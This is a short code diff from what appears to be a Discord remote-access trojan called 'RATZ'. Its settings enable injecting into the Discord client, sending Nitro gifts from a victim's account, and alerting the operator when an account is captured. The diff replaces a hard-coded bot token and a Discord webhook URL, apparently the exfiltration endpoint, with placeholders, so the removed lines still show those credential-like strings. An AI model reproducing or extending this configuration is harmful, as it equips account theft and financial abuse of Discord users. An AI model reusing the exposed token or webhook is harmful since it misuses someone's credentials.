@@ -31,7 +31,7 @@ import socket
 import uuid
 from subprocess import Popen, PIPE
 from discord import utils
-token = 'OTUxODY0NTU0NTY3MTIzMDA0.Yitq8g.8B5Opom4QjpjC0tj1u2GdJGFHr0'
+token = 'TOKENHERE'
 
 global isexe
 isexe=False
@@ -119,7 +119,7 @@ SENDHIST = True
 BUY_NITRO  =   True   # -> Send Nitro gift from Account
 DISCINJECT =   True    # -> Inject into Discord
 PINGME     =   True    # -> Get Pinged when account is Logged
-WEBHOOK    =   "https://discord.com/api/webhooks/961891205866749954/B2oafGgeJ12-nrSWAPo7BMqM1EoQDEyytrTuFt_BcHEKO-nnkeiTDocccQILn6kQlfNb"
+WEBHOOK    =   "WEBHOOKHERE"
 
 class Program():
     """    The RATZ Program    """
